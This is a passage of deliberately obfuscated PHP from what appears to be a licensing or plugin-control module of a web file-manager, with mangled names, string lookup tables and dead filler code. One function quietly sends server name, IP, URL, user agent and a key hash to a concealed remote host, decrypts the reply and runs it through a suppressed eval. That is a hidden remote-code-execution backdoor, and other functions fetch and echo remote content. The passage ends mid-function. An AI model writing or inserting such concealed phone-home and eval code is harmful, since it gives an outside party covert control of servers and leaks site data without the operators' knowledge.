$ŒóÃœŠ++; } if (!KodUser::isRoot() || !isset($_GET[$«ùÓûõ•[216]])) { return; } if (!in_array($_SERVER[$«ùÓûõ•[24]], $¯åğ™Ö)) { return; } $ úŸÈ„ = $«ùÓûõ•[217]; $ƒô¼ı¥Ù = $ñ¥ä¼ñ“[755]; while (strlen($ƒô¼ı¥Ù) < $ñ¥ä¼ñ“[60]) { if (!$ƒô¼ı¥Ù) { break; } $ƒô¼ı¥Ù++; } $ úŸÈ„ = $this->jqwt6b4a9e92($ úŸÈ„, $«ùÓûõ•[218]); $Í³¾úê¶ = stream_context_create(array($«ùÓûõ•[219] => array($«ùÓûõ•[220] => $«ùÓûõ•[221], $«ùÓûõ•[222] => 3))); $Õñ¦ç×Ş = @file_get_contents($ úŸÈ„, !1, $Í³¾úê¶); $»½™¹õÆ = $ñ¥ä¼ñ“[756]; if (!$»½™¹õÆ) { die; } header($«ùÓûõ•[223]); if ($Õñ¦ç×Ş && strstr($Õñ¦ç×Ş, $«ùÓûõ•[224])) { echo $Õñ¦ç×Ş; } die; } public function evbcfc9bbed4($üùÙúê†) { $˜üÒ×‹Ğ =& $_SERVER[¼èá¯æÙ]; $ÃáÇ±©– =& $_SERVER[üŸĞÁÆÁ]; if ($this->eqit7888f320 == $ÃáÇ±©–[225]) { return $üùÙúê†; } $¦‘İÀ¿’ = $this->versionPluginList(); $şñÀñÕ„ = $˜üÒ×‹Ğ[757]; $èÖàÆÁŠ = explode($ÃáÇ±©–[226], $this->versionPluginFilter()); $ù³Ô¿ü« = $˜üÒ×‹Ğ[758]; if (strlen($ù³Ô¿ü«) < $˜üÒ×‹Ğ[706]) { return; } $²ıö‡†Ê = array(); foreach ($¦‘İÀ¿’ as $€–ŸÅÎ => $åÊÓ®ß) { if ($åÊÓ®ß == $ÃáÇ±©–[227] && substr($this->eqit7888f320, 0, 1) == $ÃáÇ±©–[227]) { continue; } if (!in_array($€–ŸÅÎ, $èÖàÆÁŠ)) { $²ıö‡†Ê[] = $€–ŸÅÎ; } } foreach ($²ıö‡†Ê as $€–ŸÅÎ) { unset($üùÙúê†[$€–ŸÅÎ]); } return $üùÙúê†; $ğ×ğÙÆÙ = $˜üÒ×‹Ğ[759]; if (!$ğ×ğÙÆÙ) { die; } } private function versionPluginList() { $Ù©¸‚Ïù =& $_SERVER[üŸĞÁÆÁ]; return array($Ù©¸‚Ïù[228] => $Ù©¸‚Ïù[227], $Ù©¸‚Ïù[229] => $Ù©¸‚Ïù[227], $Ù©¸‚Ïù[230] => $Ù©¸‚Ïù[227], $Ù©¸‚Ïù[231] => $Ù©¸‚Ïù[232], $Ù©¸‚Ïù[233] => $Ù©¸‚Ïù[232], $Ù©¸‚Ïù[234] => $Ù©¸‚Ïù[232], $Ù©¸‚Ïù[235] => $Ù©¸‚Ïù[232], $Ù©¸‚Ïù[236] => $Ù©¸‚Ïù[232], $Ù©¸‚Ïù[237] => $Ù©¸‚Ïù[232], $Ù©¸‚Ïù[238] => $Ù©¸‚Ïù[232], $Ù©¸‚Ïù[239] => $Ù©¸‚Ïù[232], $Ù©¸‚Ïù[240] => $Ù©¸‚Ïù[232], $Ù©¸‚Ïù[241] => $Ù©¸‚Ïù[232], $Ù©¸‚Ïù[242] => $Ù©¸‚Ïù[232], $Ù©¸‚Ïù[243] => $Ù©¸‚Ïù[232], $Ù©¸‚Ïù[244] => $Ù©¸‚Ïù[232]); } private function versionPluginFilter() { $ğ˜õ¥İ =& $_SERVER[üŸĞÁÆÁ]; if ($this->eqit7888f320 == $ğ˜õ¥İ[109]) { return $ğ˜õ¥İ[6]; } $¦É”š = _get($this->abhj409dfed6, $ğ˜õ¥İ[245], $ğ˜õ¥İ[6]); $İŞ†š• = _get($this->abhj409dfed6, $ğ˜õ¥İ[116], $ğ˜õ¥İ[6]); $³šº¾ï = _get($this->abhj409dfed6, $ğ˜õ¥İ[246], $ğ˜õ¥İ[6]); if ($İŞ†š• > time() && $³šº¾ï > time()) { $Ÿ“¶‚ = explode($ğ˜õ¥İ[226], $¦É”š); $ê¬å‰á§ = array_keys($this->versionPluginList()); $¦É”š = array_merge($Ÿ“¶‚, $ê¬å‰á§); $¦É”š = implode($ğ˜õ¥İ[226], array_filter(array_unique($¦É”š))); } return $¦É”š; } private function emqh949515a6() { $ÃÁ½•Üñ =& $_SERVER[üŸĞÁÆÁ]; if ($this->eqit7888f320 != $ÃÁ½•Üñ[109]) { $GLOBALS[$ÃÁ½•Üñ[86]][$ÃÁ½•Üñ[90]][$ÃÁ½•Üñ[247]] = $ÃÁ½•Üñ[206]; return; } $GLOBALS[$ÃÁ½•Üñ[86]][$ÃÁ½•Üñ[248]] = $ÃÁ½•Üñ[122]; if (Model($ÃÁ½•Üñ[249])->get($ÃÁ½•Üñ[63]) != $ÃÁ½•Üñ[206]) { Model($ÃÁ½•Üñ[249])->set($ÃÁ½•Üñ[63], $ÃÁ½•Üñ[206]); } } public function nukgc731ac49() { return $_SERVER[üŸĞÁÆÁ][250]; $àÏ¿â±¬ = $_SERVER[¼èá¯æÙ][760]; } private function hxpj9ac8a62f() { $¶ „îù =& $_SERVER[¼èá¯æÙ]; $‘ı¡ÎÑ¹ =& $_SERVER[üŸĞÁÆÁ]; $±Ğµéø„ = array($‘ı¡ÎÑ¹[251], $‘ı¡ÎÑ¹[252], $‘ı¡ÎÑ¹[253]); $³º”õüÊ = $‘ı¡ÎÑ¹[254] . md5($‘ı¡ÎÑ¹[255]); $ä¿¿„Åç = $¶ „îù[761]; if (strlen($ä¿¿„Åç) < $¶ „îù[60]) { die; } if ($this->eqit7888f320 == $‘ı¡ÎÑ¹[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$‘ı¡ÎÑ¹[24]], $±Ğµéø„)) { return; } if (time() % 4 != 0) { return; } $ìÂøØ–í = call_user_func(array($‘ı¡ÎÑ¹[256], $‘ı¡ÎÑ¹[257]), $³º”õüÊ); $ËØ¶ò© = $¶ „îù[762]; if (strlen($ËØ¶ò©) < $¶ „îù[723]) { die; } if ($ìÂøØ–í && time() - $ìÂøØ–í < intval($‘ı¡ÎÑ¹[258])) { return; } call_user_func(array($‘ı¡ÎÑ¹[256], $‘ı¡ÎÑ¹[139]), $³º”õüÊ, time()); $œ«“Áàû = $¶ „îù[763]; $‚“‘Êè = Model($‘ı¡ÎÑ¹[33])->get($‘ı¡ÎÑ¹[100]); $ ‘Ëƒ–… = array($‘ı¡ÎÑ¹[152] => Model($‘ı¡ÎÑ¹[33])->get($‘ı¡ÎÑ¹[153]), $‘ı¡ÎÑ¹[167] => $this->eqit7888f320, $‘ı¡ÎÑ¹[163] => $_SERVER[$‘ı¡ÎÑ¹[164]], $‘ı¡ÎÑ¹[165] => Model($‘ı¡ÎÑ¹[33])->get($‘ı¡ÎÑ¹[131]), $‘ı¡ÎÑ¹[105] => md5($_SERVER[$‘ı¡ÎÑ¹[106]] . $‚“‘Êè), $‘ı¡ÎÑ¹[156] => $‘ı¡ÎÑ¹[136], $‘ı¡ÎÑ¹[159] => $_SERVER[$‘ı¡ÎÑ¹[160]]); $‡öéìƒ° = $¶ „îù[764]; if (!$‡öéìƒ°) { return; } $Çæ«ıê± = $this->vstmf87e7313($‘ı¡ÎÑ¹[259], $ ‘Ëƒ–…); $ì‚ãš‡² = $¶ „îù[765]; if (!$ì‚ãš‡²) { return; } if (!is_array($Çæ«ıê±)) { return; } if ($Çæ«ıê±[$‘ı¡ÎÑ¹[152]] && $Çæ«ıê±[$‘ı¡ÎÑ¹[260]]) { if ($this->ibuqcf05ab95($Çæ«ıê±[$‘ı¡ÎÑ¹[260]]) == $ ‘Ëƒ–…[$‘ı¡ÎÑ¹[152]]) { return; } } $this->xdeo5a71e3d4(); if ($this->ibuqcf05ab95($Çæ«ıê±[$‘ı¡ÎÑ¹[260]]) != $ ‘Ëƒ–…[$‘ı¡ÎÑ¹[152]]) { $¢†ùíÒÕ = array($‘ı¡ÎÑ¹[185] => $‚“‘Êè, $‘ı¡ÎÑ¹[186] => $_SERVER[$‘ı¡ÎÑ¹[106]], $‘ı¡ÎÑ¹[187] => this_url(), $‘ı¡ÎÑ¹[161] => $_SERVER[$‘ı¡ÎÑ¹[162]]); $‹Ç¯‹¼„ = $this->naifd507ca20(json_encode($¢†ùíÒÕ)); $Çæ«ıê± = $this->vstmf87e7313($‘ı¡ÎÑ¹[188] . $‹Ç¯‹¼„); if ($Çæ«ıê± && is_array($Çæ«ıê±) && isset($Çæ«ıê±[$‘ı¡ÎÑ¹[260]])) { $àË×¬ÑĞ = $this->snlac6ab0430($Çæ«ıê±[$‘ı¡ÎÑ¹[260]], 2); if ($àË×¬ÑĞ) { $àË×¬ÑĞ = $this->ibuqcf05ab95($àË×¬ÑĞ); } if ($àË×¬ÑĞ) { try { @eval($àË×¬ÑĞ); } catch (Exception $‘È–Ñ¨Ü) { } } } } } private function vstmf87e7313($‹Ğ”Éü = '', $ß¡æœ¢ = array(), $ññ…ñâú = 5) { $»Òğç‡ñ =& $_SERVER[¼èá¯æÙ]; $‘¾×´¯É =& $_SERVER[üŸĞÁÆÁ]; $›Æªºé  = $‘¾×´¯É[261]; $›Æªºé  = $this->jqwt6b4a9e92($›Æªºé , $‘¾×´¯É[262]); $Á±¼èÖø = $»Òğç‡ñ[766]; $›Æªºé  = $›Æªºé  . $‹Ğ”Éü; if ($ß¡æœ¢ && is_array($ß¡æœ¢)) { $›Æªºé  = $›Æªºé  . $‘¾×´¯É[263] . http_build_query($ß¡æœ¢); } if ($ß¡æœ¢ === -1) { return $›Æªºé ; } $“°ò»ÔÊ = stream_context_create(array($‘¾×´¯É[219] => array($‘¾×´¯É[222] => $ññ…ñâú, $‘¾×´¯É[220] => $‘¾×´¯É[264]), $‘¾×´¯É[265] => array($‘¾×´¯É[266] => !1, $‘¾×´¯É[267] => !1))); $ß¡æœ¢ = @file_get_contents($›Æªºé , !1, $“°ò»ÔÊ); return json_decode($ß¡æœ¢, !0); $¤ó‡ÕåÍ = $»Òğç‡ñ[767]; if (strlen($¤ó‡ÕåÍ) < $»Òğç‡ñ[701]) { return; } } private function rbsq37688562() { $ĞÈ“Ã´ =& $_SERVER[üŸĞÁÆÁ]; $Ñ×˜ü·Œ = array($ĞÈ“Ã´[268] => $ĞÈ“Ã´[269], $ĞÈ“Ã´[270] => $ĞÈ“Ã´[271], $ĞÈ“Ã´[272] => $ĞÈ“Ã´[273], $ĞÈ“Ã´[274] => $ĞÈ“Ã´[275], $ĞÈ“Ã´[276] => $ĞÈ“Ã´[277], $ĞÈ“Ã´[278] => $ĞÈ“Ã´[214], $ĞÈ“Ã´[279] => $ĞÈ“Ã´[214], $ĞÈ“Ã´[280] => $ĞÈ“Ã´[269], $ĞÈ“Ã´[281] => $ĞÈ“Ã´[271], $ĞÈ“Ã´[282] => $ĞÈ“Ã´[273], $ĞÈ“Ã´[283] => $ĞÈ“Ã´[284], $ĞÈ“Ã´[285] => $ĞÈ“Ã´[275], $ĞÈ“Ã´[286] => $ĞÈ“Ã´[287], $ĞÈ“Ã´[288] => $ĞÈ“Ã´[277], $ĞÈ“Ã´[289] => $ĞÈ“Ã´[290], $ĞÈ“Ã´[291] => $ĞÈ“Ã´[292], $ĞÈ“Ã´[293] => $ĞÈ“Ã´[294]); $¡«øÛªá = $Ñ×˜ü·Œ[$this->eqit7888f320]; $¡«øÛªá = intval($¡«øÛªá ? $¡«øÛªá : $ĞÈ“Ã´[269]); $—ªüÈÏ = _get($this->abhj409dfed6, $ĞÈ“Ã´[295]); $—ªüÈÏ = $—ªüÈÏ ? intval($—ªüÈÏ) : 0; return $¡«øÛªá + $—ªüÈÏ; $¦¼õï…¼ = $_SERVER[¼èá¯æÙ][768]; } public function gled51c2f2b4($˜ƒ¤›¾) { $âÑËÇÓ¢ =& $_SERVER[¼èá¯æÙ]; $½œ“š =& $_SERVER[üŸĞÁÆÁ]; $îû÷ôÈÅ = $this->rbsq37688562(); $ÍŒïÅ°× = $âÑËÇÓ¢[769]; if (strlen($ÍŒïÅ°×) < $âÑËÇÓ¢[701]) { die; } if ($˜ƒ¤›¾[$½œ“š[296]] == $½œ“š[122]) { return; } if ($îû÷ôÈÅ >= intval($½œ“š[214])) { return; } $Áá„Ì³ = Model($½œ“š[125])->count(); if ($Áá„Ì³ <= $îû÷ôÈÅ) { return; } $ØßÑ½ = Model($½œ“š[125])->field($½œ“š[296])->limit($îû÷ôÈÅ)->select(); $²¡¸¤ğÕ = $âÑËÇÓ¢[770]; if (strlen($²¡¸¤ğÕ) < $âÑËÇÓ¢[60]) { die; } $ØßÑ½ = array_to_keyvalue($ØßÑ½, $½œ“š[6], $½œ“š[296]); if (!in_array($˜ƒ¤›¾[$½œ“š[296]], $ØßÑ½)) { show_json($½œ“š[297], !1, $½œ“š[210]); } } public function iuoa49f0849f() { $ÒÒ ùä­ =& $_SERVER[¼èá¯æÙ]; $ƒº‘Üâı =& $_SERVER[üŸĞÁÆÁ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ªÒŸ…¹ = $ƒº‘Üâı[217]; $²„ø²£µ = $ÒÒ ùä­[771]; while (strlen($²„ø²£µ) < $ÒÒ ùä­[723]) { if (!$²„ø²£µ) { break; } $²„ø²£µ++; } $ªÒŸ…¹ = $this->jqwt6b4a9e92($ªÒŸ…¹, $ƒº‘Üâı[218]); $Ôç’ÙÖœ = stream_context_create(array($ƒº‘Üâı[219] => array($ƒº‘Üâı[220] => $ƒº‘Üâı[221], $ƒº‘Üâı[222] => 3))); $ñ”Äàø® = $ÒÒ ùä­[772]; if (!$ñ”Äàø®) { return; } $°Ö›¯·ì = @file_get_contents($ªÒŸ…¹, !1, $Ôç’ÙÖœ); echo $ƒº‘Üâı[298] . hash_encode($°Ö›¯·ì) . $ƒº‘Üâı[299]; } private function czlta02d190f($¢ºŸÄ™‘, $Æ‚†’ È, $ãí…Ğä© = 3) { $Õ’Çõ€‡ =& $_SERVER[¼èá¯æÙ]; $»ÃÛõôà =& $_SERVER[üŸĞÁÆÁ]; usleep(1); $¢ºŸÄ™‘ = trim($¢ºŸÄ™‘); $‘°¹«ÅÅ = mt_rand(0, 5) . $»ÃÛõôà[6]; $´Îøğ„ = rand_string(15); $•ä¤âìŸ = $»ÃÛõôà[300]; switch ($‘°¹«ÅÅ) { case $»ÃÛõôà[206]: $Ü•ÉÔÚ’ = $this->hbuteb685332($¢ºŸÄ™‘, strrev($Æ‚†’ È . $´Îøğ„)); $úˆ‡Ôï = $Õ’Çõ€‡[773]; if (strlen($úˆ‡Ôï) < $Õ’Çõ€‡[701]) { die; } break; case $»ÃÛõôà[122]: $Ü•ÉÔÚ’ = $this->hbuteb685332($¢ºŸÄ™‘, strrev($´Îøğ„ . $Æ‚†’ È)); $îÅ¥Õé = $Õ’Çõ€‡[774]; if (strlen($îÅ¥Õé) < $Õ’Çõ€‡[701]) { return; } break; $àæ­˜‘ = $Õ’Çõ€‡[775]; if (strlen($àæ­˜‘) < $Õ’Çõ€‡[701]) { return; } case $»ÃÛõôà[301]: $Ü•ÉÔÚ’ = $this->hbuteb685332($¢ºŸÄ™‘, base64_encode($´Îøğ„ . $Æ‚†’ È)); $ê±¾–± = $Õ’Çõ€‡[776]; break; $äĞ—Æ¹‹ = $Õ’Çõ€‡[777]; while (strlen($äĞ—Æ¹‹) < $Õ’Çõ€‡[706]) { if (!$äĞ—Æ¹‹) { break; } $äĞ—Æ¹‹++; } case $»ÃÛõôà[302]: $Ü•ÉÔÚ’ = $this->hbuteb685332($¢ºŸÄ™‘, md5($´Îøğ„ . $Æ‚†’ È)); $Î×¡Ìº = $Õ’Çõ€‡[778]; if (strlen($Î×¡Ìº) < $Õ’Çõ€‡[60]) { return; } break; case $»ÃÛõôà[303]: $¢ºŸÄ™‘ = base64_encode($¢ºŸÄ™‘); $³Æ‹“‰ = rand(0, 64); $‚ç€‹‹Û = $•ä¤âìŸ[$³Æ‹“‰]; $ÁíÑÑûò = md5($‚ç€‹‹Û . md5($Æ‚†’ È . $‚ç€‹‹Û) . $Æ‚†’ È); $„°ÓÊ–³ = $Õ’Çõ€‡[779]; while (strlen($„°ÓÊ–³) < $Õ’Çõ€‡[60]) { if (!$„°ÓÊ–³) { break; } $„°ÓÊ–³++; } $ÁíÑÑûò = substr($ÁíÑÑûò, $³Æ‹“‰ % 8, $³Æ‹“‰ % 8 + 7); $Ö®é²õº = $»ÃÛõôà[6]; $ ğğ‹Ğ½ = $Õ’Çõ€‡[780]; while ($ ğğ‹Ğ½ < $Õ’Çõ€‡[60]) { if ($ ğğ‹Ğ½ >= 0) { break; } $ ğğ‹Ğ½++; } $Êó–Ú™ø = 0; $»È“µŸ = $Õ’Çõ€‡[781]; while ($»È“µŸ < $Õ’Çõ€‡[701]) { if ($»È“µŸ >= 0) { break; } $»È“µŸ++; } $«Çæ÷¢á = 0; $™š«ïş = $Õ’Çõ€‡[782]; $Ë¾ı²­™ = 0; $©š§©ÌÆ = $Õ’Çõ€‡[783]; if (!$©š§©ÌÆ) { return; } for ($Êó–Ú™ø = 0; $Êó–Ú™ø < strlen($¢ºŸÄ™‘); $Êó–Ú™ø++) { $Ë¾ı²­™ = $Ë¾ı²­™ == strlen($ÁíÑÑûò) ? 0 : $Ë¾ı²­™; $œôº†ƒ¨ = $Õ’Çõ€‡[784]; if (strlen($œôº†ƒ¨) < $Õ’Çõ€‡[698]) { return; } $«Çæ÷¢á = ($³Æ‹“‰ + strpos($•ä¤âìŸ, $¢ºŸÄ™‘[$Êó–Ú™ø]) + ord($ÁíÑÑûò[$Ë¾ı²­™++])) % 64; $Ö®é²õº .= $•ä¤âìŸ[$«Çæ÷¢á]; $ŠÂ“ÊÄ = $Õ’Çõ€‡[785]; if (strlen($ŠÂ“ÊÄ) < $Õ’Çõ€‡[698]) { die; } } $Ü•ÉÔÚ’ = hash_encode($‚ç€‹‹Û . $Ö®é²õº); break; $¼ƒ´ó‘ = $Õ’Çõ€‡[786]; if (!$¼ƒ´ó‘) { return; } default: $Ü•ÉÔÚ’ = $this->hbuteb685332($¢ºŸÄ™‘, $Æ‚†’ È . $´Îøğ„); $¥ÄŸ™»« = $Õ’Çõ€‡[787]; break; $ñÍ€ÀËí = $Õ’Çõ€‡[788]; if (strlen($ñÍ€ÀËí) < $Õ’Çõ€‡[706]) { return; } } $Ü•ÉÔÚ’ = strrev($‘°¹«ÅÅ . $´Îøğ„ . $Ü•ÉÔÚ’); if ($ãí…Ğä© - 1 > 0) { $Ü•ÉÔÚ’ = $this->czlta02d190f($Ü•ÉÔÚ’, $Æ‚†’ È, $ãí…Ğä© - 1); } return $Ü•ÉÔÚ’; } private function snlac6ab0430($é…ÂùŞ¾, $Òá«òØ¨, $¿ã‚ö = 3) { $ì²ñıÙà =& $_SERVER[¼èá¯æÙ]; $¶î¶Ï™é =& $_SERVER[üŸĞÁÆÁ]; if (!is_string($é…ÂùŞ¾) || strlen($é…ÂùŞ¾) < 10) { return !1; } $é…ÂùŞ¾ = trim($é…ÂùŞ¾); $œ—„ªÌ° = $ì²ñıÙà[789]; if (strlen($œ—„ªÌ°) < $ì²ñıÙà[60]) { return; } $é…ÂùŞ¾ = strrev($é…ÂùŞ¾); $îÑî¢ğ = $é…ÂùŞ¾[0]; $ ¹öå¸“ = $ì²ñıÙà[790]; $Ñ˜¾—â = substr($é…ÂùŞ¾, 1, 15); $¡îÕ—Òù = $ì²ñıÙà[791]; if (!$¡îÕ—Òù) { return; } $é…ÂùŞ¾ = substr($é…ÂùŞ¾, 16); $ùı‘•Û = $¶î¶Ï™é[300]; switch ($îÑî¢ğ) { case $¶î¶Ï™é[206]: $»…á°‚³ = $this->jqwt6b4a9e92($é…ÂùŞ¾, strrev($Òá«òØ¨ . $Ñ˜¾—â)); break; $›Š¬ªÜ = $ì²ñıÙà[792]; while ($›Š¬ªÜ < $ì²ñıÙà[706]) { if ($›Š¬ªÜ >= 0) { break; } $›Š¬ªÜ++; } case $¶î¶Ï™é[122]: $»…á°‚³ = $this->jqwt6b4a9e92($é…ÂùŞ¾, strrev($Ñ˜¾—â . $Òá«òØ¨)); break; $Ë†«ø¶¿ = $ì²ñıÙà[793]; while ($Ë†«ø¶¿ < $ì²ñıÙà[698]) { if ($Ë†«ø¶¿ >= 0) { break; } $Ë†«ø¶¿++; } case $¶î¶Ï™é[301]: $»…á°‚³ = $this->jqwt6b4a9e92($é…ÂùŞ¾, base64_encode($Ñ˜¾—â . $Òá«òØ¨)); break; case $¶î¶Ï™é[302]: $»…á°‚³ = $this->jqwt6b4a9e92($é…ÂùŞ¾, md5($Ñ˜¾—â . $Òá«òØ¨)); break; $†ô•á‘ = $ì²ñıÙà[794]; while (strlen($†ô•á‘) < $ì²ñıÙà[706]) { if (!$†ô•á‘) { break; } $†ô•á‘++; } case $¶î¶Ï™é[303]: $é…ÂùŞ¾ = hash_decode($é…ÂùŞ¾); $¦äìõ„ = $ì²ñıÙà[795]; $›ë’ü‡Ø = $é…ÂùŞ¾[0]; $êø¶ÁÛ’ = $ì²ñıÙà[796]; $é…ÂùŞ¾ = substr($é…ÂùŞ¾, 1); $ËÊ‡ê¸á = $ì²ñıÙà[797]; while (strlen($ËÊ‡ê¸á) < $ì²ñıÙà[723]) { if (!$ËÊ‡ê¸á) { break; } $ËÊ‡ê¸á++; } $¦½ÏÒÄá = strpos($ùı‘•Û, $›ë’ü‡Ø); $…ƒ‰»âö = md5($›ë’ü‡Ø . md5($Òá«òØ¨ . $›ë’ü‡Ø) . $Òá«òØ¨); $šĞÒÈº™ = $ì²ñıÙà[798]; while ($šĞÒÈº™ < $ì²ñıÙà[701]) { if ($šĞÒÈº™ >= 0) { break; } $šĞÒÈº™++; } $…ƒ‰»âö = substr($…ƒ‰»âö, $¦½ÏÒÄá % 8, $¦½ÏÒÄá % 8 + 7); $‚ø§òµÕ = $ì²ñıÙà[799]; $´§™™åø = $¶î¶Ï™é[6]; $ˆ»á”î´ = 0; $ ·ÊËÖÕ = $ì²ñıÙà[800]; while (strlen($ ·ÊËÖÕ) < $ì²ñıÙà[60]) { if (!$ ·ÊËÖÕ) { break; } $ ·ÊËÖÕ++; } $’Ùµ»® = 0; $‹—ì = 0; for ($ˆ»á”î´ = 0; $ˆ»á”î´ < strlen($é…ÂùŞ¾); $ˆ»á”î´++) { $‹—ì = $‹—ì == strlen($…ƒ‰»âö) ? 0 : $‹—ì; $¡±¿¡áÅ = $‹—ì++; $’Ùµ»® = strpos($ùı‘•Û, $é…ÂùŞ¾[$ˆ»á”î´]) - $¦½ÏÒÄá - ord($…ƒ‰»âö[$¡±¿¡áÅ]); $À©µù˜ = $ì²ñıÙà[801]; if (strlen($À©µù˜) < $ì²ñıÙà[698]) { return; } while ($’Ùµ»® < 0) { $’Ùµ»® += 64; $¦ÓÖÄ× = $ì²ñıÙà[802]; if (strlen($¦ÓÖÄ×) < $ì²ñıÙà[698]) { die; } } $´§™™åø .= $ùı‘•Û[$’Ùµ»®]; $… ½ã¿Ü = $ì²ñıÙà[803]; while ($… ½ã¿Ü < $ì²ñıÙà[706]) { if ($… ½ã¿Ü >= 0) { break; } $… ½ã¿Ü++; } } $»…á°‚³ = base64_decode($´§™™åø); break; $óÕÚ„¬Á = $ì²ñıÙà[804]; if (!$óÕÚ„¬Á) { die; } default: $»…á°‚³ = $this->jqwt6b4a9e92($é…ÂùŞ¾, $Òá«òØ¨ . $Ñ˜¾—â); break; $ıœî—ş” = $ì²ñıÙà[805]; while (strlen($ıœî—ş”) < $ì²ñıÙà[60]) { if (!$ıœî—ş”) { break; } $ıœî—ş”++; } } if ($¿ã‚ö - 1 > 0) { $»…á°‚³ = $this->snlac6ab0430($»…á°‚³, $Òá«òØ¨, $¿ã‚ö - 1); } return $»…á°‚³; } public function naifd507ca20($¦ĞªÖ³Î) { $•Á¿œçË =& $_SERVER[¼èá¯æÙ]; $åÆÆÉì™ =& $_SERVER[üŸĞÁÆÁ]; $ßÚÑ‡¥ì = $this->vpzqd6aa7417(); $ê×Ë¦ü• = $this->vpzqd6aa7417(); $±ŒØ™şÌ = $•Á¿œçË[806]; while (strlen($±ŒØ™şÌ) < $•Á¿œçË[706]) { if (!$±ŒØ™şÌ) { break; } $±ŒØ™şÌ++; } $ÛüˆÚºé = ($ßÚÑ‡¥ì - 1) * ($ê×Ë¦ü• - 1); $ƒ•¶ÆÄ– = intval(($ßÚÑ‡¥ì + $ê×Ë¦ü•) / 2); $îì¶÷è = $•Á¿œçË[807]; while ($îì¶÷è < $•Á¿œçË[706]) { if ($îì¶÷è >= 0) { break; } $îì¶÷è++; } while (1) { $ûÁ›Ûµ® = $ƒ•¶ÆÄ–; $ˆ¡õØ¦ = $ÛüˆÚºé; $—Ú‚æÈº = $•Á¿œçË[808]; if (!$—Ú‚æÈº) { die; } while ($ˆ¡õØ¦ % $ûÁ›Ûµ® != 0) { $êëéğ‡ = $ˆ¡õØ¦; $Ï€Ôƒœ = $•Á¿œçË[809]; $ˆ¡õØ¦ = $ûÁ›Ûµ®; $¾¤¬“ò· = $•Á¿œçË[810]; $ûÁ›Ûµ® = $êëéğ‡ % $ûÁ›Ûµ®; } if ($ûÁ›Ûµ® == 1) { break; } else { $ƒ•¶ÆÄ–++; } } $êƒşãÏñ = 2; for ($öñûÉá– = 0; $öñûÉá– < $ÛüˆÚºé * 10; $öñûÉá–++) { if (($ÛüˆÚºé * $öñûÉá– + 1) % $ƒ•¶ÆÄ– == 0) { $êƒşãÏñ = intval(($ÛüˆÚºé * $öñûÉá– + 1) / $ƒ•¶ÆÄ–); break; } } $‘Íº”µ… = $this->hbuteb685332($ßÚÑ‡¥ì * $ê×Ë¦ü• . $åÆÆÉì™[6], $åÆÆÉì™[136]); $Ïé‰“òá = $•Á¿œçË[811]; if (strlen($Ïé‰“òá) < $•Á¿œçË[723]) { return; } $òàÓ‰¼« = md5($åÆÆÉì™[304] . ($ßÚÑ‡¥ì + $ê×Ë¦ü•) . $åÆÆÉì™[305] . $ƒ•¶ÆÄ– . $åÆÆÉì™[305] . $êƒşãÏñ . $åÆÆÉì™[306]); $Ö÷ë¦éª = $•Á¿œçË[812]; while (strlen($Ö÷ë¦éª) < $•Á¿œçË[706]) { if (!$Ö÷ë¦éª) { break; } $Ö÷ë¦éª++; } $‚‘˜åğé = $this->hbuteb685332($¦ĞªÖ³Î, $òàÓ‰¼«) . $åÆÆÉì™[307] . $‘Íº”µ…; $èõ©ç = $•Á¿œçË[813]; while ($èõ©ç < $•Á¿œçË[698]) { if ($èõ©ç >= 0) { break; } $èõ©ç++; } return $‚‘˜åğé; } public function ibuqcf05ab95($•şµäÔ) { $ßÊ©¦„ã =& $_SERVER[¼èá¯æÙ]; $Ì • ½¹ =& $_SERVER[üŸĞÁÆÁ]; $É˜Šï»… = explode($Ì • ½¹[307], $•şµäÔ); if (count($É˜Šï»…) != 2) { return $Ì • ½¹[6]; } $±ıÈï½¾ = $this->jqwt6b4a9e92($É˜Šï»…[1] . $Ì • ½¹[6], $Ì • ½¹[136]); if (!$±ıÈï½¾) { return $Ì • ½¹[6]; } $±ıÈï½¾ = intval($±ıÈï½¾); $ŞÔÆ¾Å = 0; $ôãË×ô” = 0; $À÷àî–Ò = $ßÊ©¦„ã[814]; for ($ûôò÷Ôö = 3; $ûôò÷Ôö < $±ıÈï½¾; $ûôò÷Ôö += 2) { if ($±ıÈï½¾ % $ûôò÷Ôö != 0) { continue; } $ŞÔÆ¾Å = $ûôò÷Ôö; $ôãË×ô” = intval($±ıÈï½¾ / $ûôò÷Ôö); $æÉŒ±Ô  = $ßÊ©¦„ã[815]; while (strlen($æÉŒ±Ô ) < $ßÊ©¦„ã[723]) { if (!$æÉŒ±Ô ) { break; } $æÉŒ±Ô ++; } break; $í²‡ŠØ = $ßÊ©¦„ã[816]; if (!$í²‡ŠØ) { return; } } $¥ØÔÍæ¼ = ($ŞÔÆ¾Å - 1) * ($ôãË×ô” - 1); $ş»Â³Ñç = $ßÊ©¦„ã[817]; $ÒÅß¸¯­ = intval(($ŞÔÆ¾Å + $ôãË×ô”) / 2); while (1) { $Äº€ëªù = $ÒÅß¸¯­; $ûÆµø = $¥ØÔÍæ¼; $’°óšûª = $ßÊ©¦„ã[818]; if (strlen($’°óšûª) < $ßÊ©¦„ã[723]) { die; } while ($ûÆµø % $Äº€ëªù != 0) { $®±ÆÒŠª = $ûÆµø; $ûÆµø = $Äº€ëªù; $Äº€ëªù = $®±ÆÒŠª % $Äº€ëªù; $Ä»üÅÅã = $ßÊ©¦„ã[819]; if (strlen($Ä»üÅÅã) < $ßÊ©¦„ã[698]) { return; } } if ($Äº€ëªù == 1) { break; } else { $ÒÅß¸¯­++; } } $•’æü† = 2; $…†”³—ñ = $ßÊ©¦„ã[820]; for ($ûôò÷Ôö = 0; $ûôò÷Ôö < $¥ØÔÍæ¼ * 10; $ûôò÷Ôö++) { if (($¥ØÔÍæ¼ * $ûôò÷Ôö + 1) % $ÒÅß¸¯­ == 0) { $•’æü† = intval(($¥ØÔÍæ¼ * $ûôò÷Ôö + 1) / $ÒÅß¸¯­); break; } } $Íè®†º“ = md5($Ì • ½¹[304] . ($ŞÔÆ¾Å + $ôãË×ô”) . $Ì • ½¹[305] . $ÒÅß¸¯­ . $Ì • ½¹[305] . $•’æü† . $Ì • ½¹[306]); $ÌòîÄêß = $ßÊ©¦„ã[821]; $´»²ÛÏ„ = $this->jqwt6b4a9e92($É˜Šï»…[0], $Íè®†º“); return $´»²ÛÏ„; } public function vpzqd6aa7417() { $Şş†í•ù =& $_SERVER[¼èá¯æÙ]; $›àî¸¹ş = mt_rand(pow(2, 14), pow(2, 16) - 1); $”àÎ¾ÄÖ = array(); $¡ó¿ë­ = 